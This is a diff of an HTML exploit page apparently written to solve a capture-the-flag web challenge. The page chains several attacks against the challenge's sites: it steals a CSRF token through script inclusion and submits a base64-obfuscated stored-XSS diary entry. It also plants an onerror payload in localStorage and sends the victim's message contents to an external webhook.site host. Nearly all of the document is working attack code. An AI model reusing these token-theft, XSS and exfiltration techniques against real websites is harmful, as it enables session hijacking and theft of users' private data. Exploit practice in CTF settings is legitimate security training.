@@ -2,35 +2,39 @@
 <html>
 <head>
     <title>Owley Exploit</title>
-    <!-- BYPASS REFERER CHECKS: This makes the bot look like it's requesting the script directly -->
     <meta name="referrer" content="no-referrer">
 </head>
 <body>
-    <!-- 1. The Dummy Form for the CSRF script -->
     <form id="csrf_target_form"></form>
 
     <script>
-        const W = "https://webhook.site/6ef9bff5-8aaa-4fc4-8a76-743310ff8782";
+        var W = "https://webhook.site/6ef9bff5-8aaa-4fc4-8a76-743310ff8782";
+        
+        // Catch any old-browser parsing errors
+        window.onerror = function(msg) {
+            new Image().src = W + "/?bot_js_error=" + encodeURIComponent(msg);
+        };
+
         new Image().src = W + "/?step=1_github_started";
     </script>
 
-    <!-- 2. The Token Stealer (Now with an error catcher) -->
-    <script src="https://owley-madison.jeopardy.websec.saarland/csrf_script.js" 
-            onerror="new Image().src = W + '/?error=script_failed_to_load'"></script>
+    <!-- The XSSI Token Stealer -->
+    <script src="https://owley-madison.jeopardy.websec.saarland/csrf_script.js"></script>
 
     <script>
         (function() {
-            let attempts = 0;
-            const maxAttempts = 50; 
+            var attempts = 0;
+            var maxAttempts = 100;
 
-            const tokenHunter = setInterval(() => {
+            // Notice: standard function() instead of () =>
+            var tokenHunter = setInterval(function() {
                 attempts++;
-                const tokenInput = document.querySelector('input[name="csrfmiddlewaretoken"]');
+                var tokenInputs = document.getElementsByName("csrfmiddlewaretoken");
                 
-                if (tokenInput && tokenInput.value) {
+                if (tokenInputs && tokenInputs.length > 0 && tokenInputs[0].value) {
                     clearInterval(tokenHunter);
-                    const token = tokenInput.value;
-                    new Image().src = W + "/?step=2_token_grabbed&token_start=" + token.substring(0, 5);
+                    var token = tokenInputs[0].value;
+                    new Image().src = W + "/?step=2_token_grabbed";
                     executePayload(token);
                 } else if (attempts >= maxAttempts) {
                     clearInterval(tokenHunter);
@@ -39,44 +43,46 @@
             }, 50);
 
             function executePayload(token) {
-                const innerJS = `
-                    document.domain='owley-madison.jeopardy.websec.saarland';
-                    new Image().src='${W}/?step=4_diary_xss_firing';
-                    
-                    var i=document.createElement('iframe');
-                    i.src='https://match.owley-madison.jeopardy.websec.saarland/';
-                    
-                    i.onload=function(){
-                        new Image().src='${W}/?step=5_iframe_ready';
-                        
-                        var trap = "var wait=setInterval(function(){" +
+                // Notice: standard strings instead of `backticks`
+                var innerJS = 
+                    "document.domain='owley-madison.jeopardy.websec.saarland';" +
+                    "new Image().src='" + W + "/?step=4_diary_xss_firing';" +
+                    "var i=document.createElement('iframe');" +
+                    "i.src='https://match.owley-madison.jeopardy.websec.saarland/';" +
+                    "i.onload=function(){" +
+                        "new Image().src='" + W + "/?step=5_iframe_ready';" +
+                        "var trap = \"var wait=setInterval(function(){" +
                                    "  var m=parent.document.getElementById('message');" +
                                    "  if(m && m.value.length > 5){" + 
-                                   "    new Image().src='${W}/?flag='+encodeURIComponent(m.value);" +
+                                   "    new Image().src='" + W + "/?flag='+encodeURIComponent(m.value);" +
                                    "    clearInterval(wait);" +
                                    "  }" +
-                                   "}, 500);";
+                                   "}, 500);\";" +
+                        "var p = '</option><img src=x onerror=\"' + trap + '\">';" +
+                        "i.contentWindow.localStorage.setItem('favorites', JSON.stringify([p]));" +
+                        "new Image().src='" + W + "/?step=6_poisoned_redirecting';" +
+                        "window.location.href='https://chat.owley-madison.jeopardy.websec.saarland/';" +
+                    "};" +
+                    "document.body.appendChild(i);";
 
-                        var p = '</option><img src=x onerror="' + trap + '">';
-                        i.contentWindow.localStorage.setItem('favorites', JSON.stringify([p]));
-                        
-                        new Image().src='${W}/?step=6_poisoned_redirecting';
-                        window.location.href='https://chat.owley-madison.jeopardy.websec.saarland/';
-                    };
-                    document.body.appendChild(i);
-                `;
+                var encodedJS = btoa(innerJS);
+                var diaryEntry = '<img src="x" onerror="eval(atob(\'' + encodedJS + '\'))">';
 
-                const encodedJS = btoa(innerJS);
-                const diaryEntry = '<img src="x" onerror="eval(atob(\\'' + encodedJS + '\\'))">';
-
-                const form = document.createElement('form');
+                var form = document.createElement('form');
                 form.action = 'https://diary.owley-madison.jeopardy.websec.saarland/entry';
                 form.method = 'POST';
-                form.innerHTML = '<input name="content" id="c"><input name="csrfmiddlewaretoken" id="t">';
-                document.body.appendChild(form);
                 
-                document.getElementById('c').value = diaryEntry;
-                document.getElementById('t').value = token;
+                var c = document.createElement('input');
+                c.name = 'content';
+                c.value = diaryEntry;
+                form.appendChild(c);
+
+                var t = document.createElement('input');
+                t.name = 'csrfmiddlewaretoken';
+                t.value = token;
+                form.appendChild(t);
+                
+                document.body.appendChild(form);
                 
                 new Image().src = W + "/?step=3_submitting_to_diary";
                 form.submit();
